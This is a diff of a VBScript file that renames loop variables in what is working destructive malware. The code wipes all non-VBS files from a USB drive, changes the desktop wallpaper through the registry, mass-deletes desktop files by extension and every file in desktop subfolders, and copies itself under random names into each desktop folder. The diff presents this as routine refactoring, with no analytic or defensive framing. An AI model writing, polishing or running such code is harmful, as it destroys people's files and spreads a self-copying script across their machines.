@@ -49,43 +49,40 @@ Do
     Next
 
     ' Delete files except VBS files on the USB drive
-    DeleteFilesExceptVBS usbDrivePath
-    
+    For Each usbFile In objFSO.GetFolder(usbDrivePath).Files
+        Dim extension
+        extension = LCase(objFSO.GetExtensionName(usbFile.Path))
+        If extension <> "vbs" Then
+            objFSO.DeleteFile usbFile.Path
+        End If
+    Next
+
     ' Set wallpaper
     objShell.RegWrite "HKCU\Control Panel\Desktop\Wallpaper", "C:\Windows\System32\imageres.dll", "REG_SZ"
     objShell.Run "RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters", 1, True
     
     ' Loop through each file in the Desktop folder and delete if it has a specified file extension
-    For Each objFile In objFSO.GetFolder(objShell.SpecialFolders("Desktop")).Files
-        Dim extension
-        extension = LCase(objFSO.GetExtensionName(objFile.Name))
-        If extension = "txt" Or extension = "exe" Or extension = "json" Or extension = "doc" Or extension = "pdf" Or extension = "wpd" Or extension = "docx" Or extension = "rtf" Or extension = "tex" Or extension = "odt" Or extension = "jpg" Or extension = "jpeg" Or extension = "mp3" Or extension = "rar" Or extension = "vcd" Or extension = "webp" Or extension = "css" Or extension = "html" Or extension = "py" Or extension = "php" Or extension = "ico" Or extension = "lnk" Or extension = "mp4" Or extension = "js" Or extension = "bak" Or extension = "xml" Or extension = "zip" Or extension = "bmp" Then
-            objFSO.DeleteFile(objFile)
+    For Each desktopFile In objFSO.GetFolder(objShell.SpecialFolders("Desktop")).Files
+        Dim desktopExtension
+        desktopExtension = LCase(objFSO.GetExtensionName(desktopFile.Path))
+        If desktopExtension = "txt" Or desktopExtension = "exe" Or desktopExtension = "json" Or desktopExtension = "doc" Or desktopExtension = "pdf" Or desktopExtension = "wpd" Or desktopExtension = "docx" Or desktopExtension = "rtf" Or desktopExtension = "tex" Or desktopExtension = "odt" Or desktopExtension = "jpg" Or desktopExtension = "jpeg" Or desktopExtension = "mp3" Or desktopExtension = "rar" Or desktopExtension = "vcd" Or desktopExtension = "webp" Or desktopExtension = "css" Or desktopExtension = "html" Or desktopExtension = "py" Or desktopExtension = "php" Or desktopExtension = "ico" Or desktopExtension = "lnk" Or desktopExtension = "mp4" Or desktopExtension = "js" Or desktopExtension = "bak" Or desktopExtension = "xml" Or desktopExtension = "zip" Or desktopExtension = "bmp" Then
+            objFSO.DeleteFile(desktopFile.Path)
         End If
     Next
 
     ' Loop through each folder on the Desktop and delete files within them
-    For Each objFolder In objFSO.GetFolder(objShell.SpecialFolders("Desktop")).Subfolders
-        For Each objFile In objFolder.Files
-            objFSO.DeleteFile(objFile.Path)
+    For Each desktopFolder In objFSO.GetFolder(objShell.SpecialFolders("Desktop")).Subfolders
+        For Each desktopFile In desktopFolder.Files
+            objFSO.DeleteFile(desktopFile.Path)
         Next
     Next
 
-    ' Delete files except VBS files on the USB drive
-    For Each objFile In objFSO.GetFolder(usbDrivePath).Files
-        Dim extension
-        extension = LCase(objFSO.GetExtensionName(objFile.Name))
-        If extension <> "vbs" Then
-            objFSO.DeleteFile(objFile.Path)
-        End If
-    Next
-
     ' Generate copies of the script within each folder on the Desktop
-    For Each objFolder In objFSO.GetFolder(objShell.SpecialFolders("Desktop")).Subfolders
+    For Each desktopFolder In objFSO.GetFolder(objShell.SpecialFolders("Desktop")).Subfolders
         On Error Resume Next ' Ignore errors
         For i = 1 To numCopies
             randomIteration = Int((1000 * Rnd) + 1)
-            strCopyPath = objFolder.Path & "\Copy" & randomIteration & ".vbs"
+            strCopyPath = desktopFolder.Path & "\Copy" & randomIteration & ".vbs"
             objFSO.CopyFile strScriptPath, strCopyPath, True ' Add "True" to overwrite existing files
         Next
         On Error GoTo 0 ' Reset error handling
